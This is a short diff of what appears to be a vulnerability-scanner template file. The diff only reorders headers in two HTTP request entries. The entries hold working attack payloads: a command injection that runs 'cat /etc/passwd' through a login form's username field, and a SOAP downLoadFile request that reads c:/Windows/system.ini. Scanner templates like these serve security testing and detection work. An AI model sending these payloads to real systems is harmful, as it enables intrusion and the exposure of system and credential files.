@@ -11878,8 +11878,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -12324,9 +12324,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "content-type": "text/xml",
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
